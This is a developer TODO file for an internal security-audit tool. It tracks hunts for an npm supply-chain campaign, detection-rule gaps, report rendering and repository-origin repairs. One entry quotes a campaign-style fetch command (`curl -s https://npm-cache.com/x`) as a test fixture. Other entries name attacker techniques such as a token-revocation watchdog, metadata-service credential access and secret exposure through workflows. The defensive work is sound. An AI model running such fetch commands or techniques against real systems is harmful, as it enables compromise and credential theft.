# TODO — AuditGH

## Hunt rounds 6–7 — five new vectors, and two of them closed (2026-08-11)
- [x] Five collectors landed and run: `hunt_advisory_iocs.py` (campaign infrastructure + file hashes, with a per-platform `RemoteUrl` coverage control), `hunt_antiremediation.py` (the `gh-token-monitor` watchdog, swept by name and by shape), `hunt_commit_messages.py` (Unit 42's extortion string, with the commit-search index limit measured rather than cited), `hunt_install_prevention.py` (T03's control half — `ignore-scripts` in `.npmrc` and installing workflows), `build_advisory_coverage.py` (named / measured / controlled kept as three axes). Renderer wired for all four vectors plus the advisory-coverage section; report renders exit 0, AMBER, 14 vectors, 13 actions
- [x] Two stale assertions in `tests/test_hunt_report.py` corrected against the rendered strings, with a probe added for each branch the change created — 49/49 (2026-08-11)
- [x] `tests/test_hunt_commit_messages.py` — 11 offline probes on the sweep that decides whether that vector's zero can mean anything (2026-08-11)
- [ ] **Three of the five collectors still have no unit tests of their own.** Their output is exercised only through the renderer's vector functions, so an artifact-shape change is caught at render time rather than at commit time. Highest value remaining: `build_advisory_coverage.py`'s not-measured path — a mapping pointing at a missing artifact must land as a gap, never as a green
- [x] **Commit-message sweep closed** (2026-08-11). `INCOMPLETE` → `CLEAR`: 112 stored in-window commit messages matched offline (75 on a non-default ref, the population commit search does not index), plus 118 of 141 in-window pushed ranges read whole via paginated compare — 786 commits, 0 marker hits, matcher proven. Residue that remains is a coverage gap, not unread work: 15 commits and 23 deletion events on refs deleted inside the window (HTTP 422)
- [x] **Registry-proxy vector closed** (2026-08-11). `INCOMPLETE` → `CLEAR`. It was not waiting on the token — Rob acquired it and the re-run returned the same five feeds, the same zeros and the same `coverage_supports_negative_finding: false`. The flag carried a blanket `not feeds_with_errors` term beside the narrower rule stated in the same file (an unreadable feed matters only where it has an npmjs upstream to cache from), so the one 403 — on a feed with no such upstream — voided the reading of the other four. Also corrected: the residue's claim that "the listing did not enumerate npm". `list_packages()` sends `protocolType=npm` and always has. Coverage is now decided per feed in three states, `--registry-proxy` resolves through `latest_round()`, and `tests/test_check_azure_artifacts.py` adds 10 offline probes
- [ ] **Request `ReadPackages` on feed `SleepNumberIndigo/k8s-manifests`.** Still open, and still worth filing even though its vector now reads `CLEAR`. Six-field, as emitted by the collector: api `Azure DevOps REST`, endpoint `GET https://feeds.dev.azure.com/SleepNumberIndigo/_apis/packaging/Feeds/aa276ed1-83f6-4194-8f07-bebc80762c75/packages`, permission `ReadPackages` on that feed, grant_type feed-level permission on the identity already in use, granted_by the feed's Azure DevOps administrator. What it proves is narrower than it looks: the feed has no `registry.npmjs.org` upstream, so it cannot hold a version **cached** from the public registry — what stays unread is a package **published directly** into it
- [ ] **Request read access to the egress proxy / web-gateway logs.** Two vectors depend on it and neither is closable inside Defender: endpoint install activity (69 install command lines ran, 0 tarball fetches recorded — `RemoteUrl` carries no path on the platforms that install npm) and the advisory IOC sweep's `Bun/1.3.13` User-Agent, which `DeviceNetworkEvents` has no column for. Identify the log owner first; this is a request outside this work, not a query
- [ ] **Decide whether the anti-remediation vector should stay `INCOMPLETE`.** Its sweep is clean and its residue is an incident-response process gate, not unread data — the rotation ordering is written in `supply-chain-hunt-ttp.md` §6.3 but no IR process requires it before a rotation. As written the vector can never reach `CLEAR`, and no query will move it
- [x] `handoff.md` and `.make-it-state.md` rewritten against the verified current state (2026-08-11) — both described the CHAINDROP work as uncommitted when it landed in `874bd0f` / `0ee72c3` on 2026-08-07

## Report rendering
- [x] Markdown → HTML → PDF renderer in `src/reporting/`, wired into the six zero-day export endpoints, the scan-report generator, `ReportFormat.PDF`, and a `scripts/report/md2pdf.py` CLI (2026-08-07). 32 tests green
- [x] Three-part report structure — Part 1 Situation / Part 2 Action Plan / Part 3 Evidence, with 3.1 Proof, 3.2 Target Resources, 3.3 Mitigations (2026-08-07). Ordering and every figure computed in code, phrasing model-authored under a no-digits rule; effort as a second axis that never reorders across waves. 43 tests in `tests/test_briefing.py`
- [ ] **Exercise `_author_zda_briefing` against a live provider.** `POST /ai/zero-day` now calls it, but the host cannot import `ai.py` (loguru, psycopg2) so the model path has only been tested against a fake. Confirm: the model's prose survives validation on real output, a rejected first attempt is retried with the reason attached, and the `briefing` object round-trips through the export endpoints unchanged
- [ ] **Check what the briefing costs per analysis.** It adds one LLM call to every zero-day run, with up to one retry. If the retry rate is high the prompt needs work, not the validator — the digit rule is the guarantee the design rests on
- [x] **Verify the six export endpoints in a container** (2026-08-07). All six answer; `tests/test_export_endpoints.py` needed `AUTH_REQUIRED=false` as well as `AUTH_DISABLED=true` — `AuthenticationMiddleware` returns 401 before any dependency resolves, so `dependency_overrides` alone could never reach the route
- [ ] Saved reports in `localStorage` predating the briefing have no `briefing` key. They export via the deterministic fallback, which is correct but silent about *why* — consider saying "this report predates the written summary" rather than "no language model was configured"
- [ ] `src/api/routers/api_audit.py` and the scan-report path in `src/reports/generator.py` build findings from their own shapes; the reach classifier only reads `environment`/`environments`/`archived`. Wire the P1 deployment-topology data in so `reach` is a lookup rather than an inference — it is the multiplier the whole ranking turns on and it is `unknown` for most findings today
- [x] **Rebuild `Dockerfile.api` and render one PDF inside it** (2026-08-07). Rasterized and inspected, which is the only check that finds any of this: every digit in every report was invisible (color emoji fonts own the ASCII digits and their CBDT bitmaps draw as nothing), and the ✅/⚠️/🔴 marks were blank for the same reason. Fixed with `unicode-range` fences, `fonts-symbola` + `fonts-noto-core`, and a text-presentation rewrite; 133 tests green in the container
- [ ] **`pip install -U weasyprint` on the host.** `requirements.txt` now floors at 69.0 because 69 rejects CSS that 68 silently accepted; the host still resolves 68.1, so it renders a different document from the container and `test_the_stylesheet_has_no_declarations_weasyprint_discards` cannot see the regressions it exists to catch
- [ ] The four severity markers 🔴🟠🟡🔵 differ only by color, and the outline fonts that make them visible are monochrome — they now render as four near-identical hatched circles. The Severity column next to them carries the meaning, so nothing is lost, but the marker column no longer marks anything. Either drop it from `report.md.j2` or give the severity cell a CSS color and a shape that survives grayscale
- [x] Decide staging — committed 2026-08-07 (`0ee72c3`), by targeted `git add` rather than `-A`
- [ ] `_offline_url_fetcher` calls `weasyprint.urls.default_url_fetcher`, which warns on every render that it is going away. Move to the `URLFetcher` class before the version that removes it. Fails closed if it is missed — the import raises and the export returns an error rather than reaching the network — but it is the one function standing between LLM-authored report text and an outbound request, so it should not be the thing that breaks on an upgrade
- [ ] Optional: retire `reportlab` once the API-audit PDF export in `src/api/routers/api_audit.py:4228+` moves to the shared renderer. It is the only remaining consumer

## Repository origin resolution
- [x] **The clone URL and the credential came from different columns** (2026-08-07). System Architecture failed on `web-webadmin` with `remote: Repository not found.`; the repository is `sleepnumberlabs/web-webadmin`, private and not archived. `Repository.url` named `SleepNumberInc` while `Repository.organization_id` pointed at `sleepnumberlabs`, and the caller took the token from the foreign key and the path from the string column. **483 of 2,540 rows disagree, in both directions** (445 `url=inc/fk=labs`, 38 the reverse), and every sampled row in both directions resolved to *sleepnumberlabs* — so neither column is authoritative and asking GitHub is the only correct resolution. New `src/api/utils/repo_origin.py` probes candidates with each organization's own credential, takes GitHub's `full_name` so a rename does not re-stale it, and persists the correction. `RepositoryOriginError` names every organization asked and prices the `repo` scope that would turn a 404 into proof of absence — the old path treated the 404 as permanent and would have reported the repository deleted. 12 probes
- [x] **Bulk-repaired the mismatched rows** (2026-08-07). `scripts/maintenance/repair_repo_origins.py` builds an organization inventory from paginated list endpoints — **33 requests, not 483–966** — so the whole estate is resolved for a fraction of the shared 5000/hr budget, and every row is answered rather than only the broken ones. Dry run is the default. Result: 482 self-contradictory rows examined, **481 corrected, all to `sleepnumberlabs`** (443 URL rewrites, 38 foreign-key rewrites). Re-run examines 1 row, so it converged. Pre-repair `url`/`organization_id` snapshot at `/tmp/repo_origin_backup.json` in the API container
- [x] **Completeness control before the repair** (§0.1). Each listing checked against GitHub's own count for that organization: `sleepnumberinc` 2,285 of 2,285, `sleepnumberlabs` 516 of 516, **`sleepnumber` 9 of 12 — excluded from resolution rather than treated as empty.** A truncated listing read as an empty one would have moved rows to the wrong organization with full confidence
- [ ] **Request `repo` scope on the `sleepnumber` organization** for the credential in the secrets store. `GET /orgs/sleepnumber/repos` returns 9 while `GET /orgs/sleepnumber` reports 12, so 3 repositories are invisible. Consequence today is bounded and stated: no repaired row named `sleepnumber` in either column, so nothing was misfiled — but if one of those 3 shares a name with a repaired row, that row's ambiguity is unseen rather than absent. Six-field gap: api `GitHub REST`, endpoint `GET /orgs/sleepnumber/repos?type=all`, permission `repo` (classic) or `metadata: read` org-wide (fine-grained), grant_type org-owner authorization of the existing token, granted_by `sleepnumber` org owner, proves that the 9 visible repositories are all 12
- [ ] `terraform-module-template` exists in **both** `sleepnumberinc` and `sleepnumberlabs`, so an inventory cannot say which one the row means. Left for `resolve_clone_target` to settle by probing on first touch — the one row the bulk repair deliberately did not write

## npm supply-chain hunt / CHAINDROP
- [x] Fold the StepSecurity CHAINDROP analysis into all four hunt surfaces (2026-08-06): new per-source IOC file, 8 TTP edits, 10 ids-ips edits, ~13 handover edits, rules 6 → 9
- [x] Reorder incident response so the token-revocation watchdog is removed *before* credentials are rotated — revocation is the payload's trigger (2026-08-06)
- [x] **Decide staging** — committed 2026-08-07 in `874bd0f` (rules JSON, the per-source IOC file and both npm playbooks), by targeted `git add`. `github_conf/IOC_KQL.zip` and `nmptemp` are still untracked and still belong to the other session; leave them
- [x] **Resolve the open Tier 0 escalation** — closed 2026-08-10 in StepSecurity's favor, and this line stayed open in `TODO.md` and `handoff.md` for a day after `supply-chain-hunt-ttp.md` recorded the resolution. Round 4 re-derived against the live registry with brackets at 18:00Z and at 2026-08-05T00:00Z and got the **identical** 2,208 specs across 442 names, latest publish 13:18:41.376Z — which corroborates 13:20Z to within 79 seconds. Bracket-independence is the actual result: widening the window does not move the set. The interim "hunt to 13:20Z, report 12:11:19.909Z" rule is **withdrawn**; hunt scope runs to 13:30:46.398Z. Kodem's relay of a Socket 15:39–15:44Z publish is refuted by the same proof and does not reopen this
- [x] **Ingest Kodem** (2026-08-11) — `github_conf/ioc/kodem_2026_08.json`. It had been cited in the §1.1 source table since the reference run with no file behind it; a row reads as a source that was consumed when it was only one that was seen. Diff against the whole corpus found three things absent: `169.254.169.254` as a *detection input* (the service itself was already in the rotation scope of four other files — that is the response side, not a query), the **source-side** plant message, and Snyk's `d8c850c7`. Also recorded: Kodem's runbook rotates tokens at step 1 and hunts persistence at step 7, which inverts §6.3 and would trip the watchdog
- [x] **The advisory IOC sweep reported the hunt itself as a critical C2 contact** (2026-08-11, fixed). Five rows on `usffhg6x7jh4`, all Claude Code heredocs that import this collector to exercise `classify_command_line` and carry `curl -s https://npm-cache.com/x` as a test fixture. `classify_command_line` checked the tool before the path, so a quoted literal inside a test for this detection was promoted by the detection it was testing. `hunt_antiremediation.py` had already solved this and demoted 247 rows of the same kind on the same estate **in the same cycle** — two divergent copies of one judgement. `ANALYSIS_MARKERS` and the path-before-tool ordering ported across; vector `FINDINGS` → `INCOMPLETE`; new `tests/test_hunt_advisory_iocs.py`, 9 probes, half of them pinning that the demotion swallows nothing real
- [ ] **Give the two collectors one copy of the analysis-corpus judgement.** `ANALYSIS_MARKERS` and the path-before-tool ordering now exist verbatim in `hunt_antiremediation.py` and `hunt_advisory_iocs.py`, and the drift between them is exactly what produced five critical findings on our own workstation. The tests pin the behavior, not the sharing, so the copies can still diverge — lift both into a small shared module in `scripts/hunt/`. Also carry the residual risk forward when it moves: an attacker running their fetch from inside a path named `auditgithub` is demoted too, which is stated in the docstring and should stay stated
- [ ] **Write shape proofs for the three new rules.** The KQL library covers 6 of 9; there is no `detections/`, `backlog/` or `poc/` file for the watchdog, the Bun fetch or the memory scrape, so their 30-day history is unexamined rather than clean. (The "coordinate before adding — other session's uncommitted directory" caveat is **withdrawn**: `github_conf/detections/kql/` is tracked and clean as of 2026-08-11)
- [ ] **Promote `backlog/23-imds-contact-from-install-lineage.kql` out of backlog, or leave it there deliberately.** Three preconditions, in order, and none is a permission: (a) Defender reachable from the collector at all — today it is not, see below; (b) two assumptions measured rather than assumed, that `InitiatingProcessParentFileName` is populated for lifecycle scripts on the runners, and that `DeviceNetworkEvents` records link-local traffic in this tenant at all — the second is the same failure class as rule 14's `RemoteUrl` prerequisite, which deploys cleanly and can never fire; (c) a `poc/` shape proof of the **joined** condition, not the raw address. Do not arm on the address alone: kubelet, cloud-init and every SDK credential chain contact it correctly and constantly, so it would fire estate-wide on day one and be disarmed within a day. Until then the report says UNSWEPT, which is what it is
- [x] **The Defender half of the hunt could not execute on this host — resolved 2026-08-11 by Docker coming back up.** It was an environment outage, not an access gap: `hunt_endpoint_defender.py:209` → `src/api/database.py:22` → `ModuleNotFoundError: No module named 'psycopg2'`, plus the Postgres holding the encrypted credential store being in a stopped Docker. Two independent blockers, so no access request was filed and none was needed — the app registration carries `ThreatHunting.Read.All`. Closed by running the collectors *inside* `auditgh_api` (`docker exec -w /app auditgh_api python scripts/hunt/…`), which has the driver and reaches the store; the repo is mounted, so artifacts land on the host. The host interpreter still has no `psycopg2` and this is the standing workaround, not a fix
- [ ] **Run the four Defender collectors from inside the container by default.** They are still written as if the host could reach the database, so the next person hits the same `ModuleNotFoundError` and may read it as an access problem. Either document the `docker exec` form in the collector docstrings or have `database.py` fail with a message that names the container
- [x] **Endpoint hunt run for the first time** (2026-08-07). The report's "Could not check - no access" was false: `GraphClient.from_db` reads the encrypted store, which held an active `ThreatHunting.Read.All` registration the whole time. New `scripts/hunt/hunt_endpoint_defender.py`; control passed (11.5M events / 3,229 devices in an hour), node→bun **0**, `bun.exe` **0** on all three tables, one Homebrew Bun on one macOS device triaged and explained. Vector is now `INCOMPLETE` on 5 named gaps, not `BLOCKED`
- [x] **Doctrine §0.6 enforced in `render_hunt_report.py`** (2026-08-07). `validate_vectors` aborts the render (exit 2) on a status with no coverage evidence, an `INCOMPLETE` with no named residue, a `BLOCKED` with no six-field `access_required`, or a `FINDINGS` naming nothing. Also fixed: the repo-tree sweep's bucket arithmetic, the delta's self-hedged rename warning, and three "Every…" overclaims in Section 1. 34 tests
- [x] **Renderer was reading a stale round artifact** (2026-08-07). `--trees` defaulted to `repo_trees_r3_coverage.json` while `repo_trees_r4_coverage.json` sat beside it three hours newer with the accounting that resolved r3's 50 `tree_failed` entries as empty repositories (49 × `HTTP 409: Git Repository is empty`, 1 × `file_count: 0`). The report claimed 50 repos unread; nothing was unread. `latest_round()` now picks the highest round numerically and the run prints which artifact it read. Files-on-disk is `CLEAR`, buckets sum
- [ ] **Audit the other `--*` defaults for the same staleness class.** `--branches`, `--code-search`, `--ioc` and `--posture` are all pinned to `_r3` filenames. Only trees had an r4, so nothing else is wrong today — but the failure mode is silent and the next re-run creates it
- [ ] **Onboard the 516 general-purpose devices Defender sees but receives no telemetry from — not 1,379.** The gap is real: 0 `DeviceProcessEvents` from any non-onboarded device over 7d *and* 30d, and `SensorHealthState == "Active"` on 0 of them. But 1,379 is the wrong denominator. By Defender's own `DeviceType`: **516** Workstation/Server after removing 12 merged-duplicate records (528 raw, 512 distinct names) — the actual gap; **557** NetworkDevice/Printer/IoT/BMS/mobile (366 network, 62 comms, 79 mobile, 40 printers, 7 A/V, 3 other) that cannot run the campaign's Windows/Linux/macOS Bun bootstrap; **291** `DeviceType: Unknown`, unclassifiable. Buckets sum to 1,376 (collection drift from 1,379). The 516 are live, not stale AD objects — worth testing because 412 of the 476 "Can be onboarded" workstations were discovered by *Defender for Identity*, exactly the pattern a stale computer object produces; **492 of the 512 distinct names authenticated in the last 30 days**, 378,060 logon events, most recent `2026-08-07T19:12:06Z`, over a control of 5,368,916 `IdentityLogonEvents` across 5,217 devices. Honest figure to carry: **807** (516 unmonitored + 291 unclassifiable). Caveat that must travel with it: excluding the 557 rests on Defender's `DeviceType` classification, not on a query proving those devices lack a node toolchain. Not yet written into `interpret()` in `hunt_endpoint_defender.py` or into the P2 action text
- [x] **Spelling: American English across every tracked text file** (2026-08-07). 42 files of prose, plus the IOC/detection JSON and all 34 KQL files (comment headers only, no query text). No identifier, dict key or JSON key renamed — audited rather than assumed; `bun_artefact_sweep` was the one exception and only after confirming no consumer reads it from a stored artifact. Excluded as external contracts: `cancelled` (GitHub Actions API + `asyncio`), `colors.grey` (reportlab), `@img/colour` (npm package), `aria-labelledby` (HTML), `analyses` (already American). Two count labels changed, so the delta skips those two comparisons for one cycle
- [x] **`Bun-artifact commits` was structurally incapable of being non-zero** (2026-08-07). Read `bun_artifacts_changed` — a per-*commit* field — off the sweep's top-level dict, so `.get` returned its default every run. It printed the true answer, which is why it survived. Now counted from `flagged_commits`; two probes assert it moves and that it does not read the top-level key
- [ ] **`SHA256` is empty on every Linux `DeviceProcessEvents` row** (0 of 111,867). Provenance triage on any future Bun or payload binary is a hash comparison, so Linux is blind to it no matter how suspicious the path looks. Windows and macOS are fully populated
- [ ] **Request `AuditLog.Read.All`** so `GET /auditLogs/signIns` works app-only. Until then sign-in analysis must come from `AADSpnSignInEventsBeta` / `IdentityLogonEvents`, which `ThreatHunting.Read.All` does cover — a workaround, not a gap, but it should be written down where the next person looks. Now emitted by the collector as a structured §0.6 `access_required` entry and rendered in Section 3 as a request forwardable to a tenant admin as-is
- [x] **`coverage/07` run 2026-08-11, and the answer is no.** `SHA1` is not populated on `DeviceFileEvents` estate-wide: Windows11 97.5% of 1,767,800 rows, **Windows10 81.7%**, WindowsServer2025 95.7%, macOS 100%. So `stopAndQuarantineFiles` will silently no-op on roughly one in five Windows10 rows **while the alert still fires** — the worst possible combination, because the operator sees a quarantine action on an alert that did not quarantine
- [ ] **Decide `token-monitor`'s arming on what `coverage/07` actually said.** The blocker is answered, not cleared: arm it for the *alert*, not for the action, and drop or explicitly caveat `stopAndQuarantineFiles`. Two things must travel with that decision — quarantining a watchdog binary would not remove its systemd unit or launchd plist in any case, and §7 step 1.5 already requires removal be confirmed on the host with `pgrep -af gh-token-monitor` rather than from an alert. Write that into the rule's own comment, or the next reader re-derives it
- [ ] Run the hunt checks added 2026-08-06 that have **never been executed**: all branches (up to 50/repo), the `${{ toJSON(secrets) }}` primitive rather than the workflow filename, npm publisher-side abuse (`bypass_2fa: true` tokens, self-minted attestations), and the wide credential-rotation scope. (**The persistence sweep is off this list as of 2026-08-11** — `ir/52` ran for the first time: 0 rows over 30 days across `DeviceFileEvents` and `DeviceRegistryEvents`, with each half separately controlled as non-empty so the zero is a zero and not an empty table)
- [ ] Enumerate `LANG` / locale across the estate — the payload declines to run under a Russian locale and those hosts read clean on every behavioral rule
- [ ] Prevention needing no Microsoft approval: package-manager-native release-age gate rollout; egress allowlist on build agents; remove passwordless `sudo` from runner service accounts (verify no build step depends on it first)

## Deployment topology (branch `deployment-topology-p1-p2`)
- [x] P1 — capability map from centrally-shared reusable workflows (2026-08-06): 4207 rows / 374 repos / 288 reaching production, 84 contracts parsed
- [x] Shared GitHub budget governor + scheduler deprioritization (2026-08-06)
- [x] P2 — deployment observation service, migration 021, CLI, 2 API routes, 19 tests (2026-08-06, code complete)
- [ ] Apply `migrations/021_deployment_observation.sql` — **P2 writes fail without it** (upsert needs `uq_deployments_repo_external_id`)
- [ ] Finish P2 docs in `docs/playbooks/deployment-topology.md`: §2 converse warning, §3 `github_deployment` confidence rubric, new §13
- [ ] Verify in container once Docker responds: 86 tests, and `POST /cicd/topology/observe` + `GET /cicd/topology/activity` registered (resolve via `original_router.routes`; `/openapi.json` is auth-protected)
- [ ] Run P2: `--dry-run` to size cost, then `--repo-limit 25`, then the full mapped set; re-run to prove resume skips completed repos
- [ ] Decide on P3 (in-repo workflow parsing, ~2200 calls, closes the measured ~90–450 repo gap)

## Security
- [ ] **File ticket: 9 consumer repos call central workflows at deleted branches.** Dangling ref = org member who can push that branch name gets code execution in every consumer, with the consumer's secrets. Detection SQL in playbook §11
- [ ] **File ticket: pin `terraform-setup-composite-action@v2` to a commit SHA.** 46 contracts hand it `toJSON(secrets)`; a moving tag means one action compromise exposes every consumer's full secret set (playbook §9)
- [ ] Request org-variables read: `GET /orgs/SleepNumberInc/actions/variables` returns 403. Ask for org admin or fine-grained `organization_actions_variables: read`. Lowers precision, not coverage
- [ ] Address Dependabot alerts: 5 high + 11 moderate on SleepNumberInc remote, 3 high + 10 moderate on sealmindset remote
- [x] Run `/fix-it medium` — 15 of 18 MEDIUM findings resolved (2026-05-22)
- [ ] postcss XSS vulnerability (transitive via next) — awaiting Next.js patch, no safe upgrade path
- [ ] Run `/fix-it all` to clear remaining LOW (5) + INFO (2) findings
- [ ] Fix pre-existing TypeScript error in `components/APIAuditView.tsx:1052` (`external_url` property)
- [x] Merge `security-workstation` branch to `main` — its tip `dc87754` is now an ancestor of `origin/main`. The local branch is merged and safe to delete; `origin/security-workstation` still lags by 4 commits

## Docs
- [ ] Review and commit `docs/EA_Design_Pattern_AWS_Bedrock.md` and `docs/EA_Design_Pattern_MakeIt.md` (untracked)

## Cleanup
- [ ] Review `.scan_resume_state.pkl` — commit or add to .gitignore
- [x] `.cache/` (431 npm scan JSONs) added to .gitignore (2026-08-06)
- [ ] **Docker Desktop still down** — `docker info` returned no server version and `docker compose ps` exited 1 at wrap-up on 2026-08-06 (second session in a row). Restart it before any container work; the 86-test container run and migration 021 are both blocked on it
- [ ] Worktree `../auditgithub-deps` (branch `deps-webui-safety`, clean, unmerged) left in place deliberately — another session's. Do not remove it
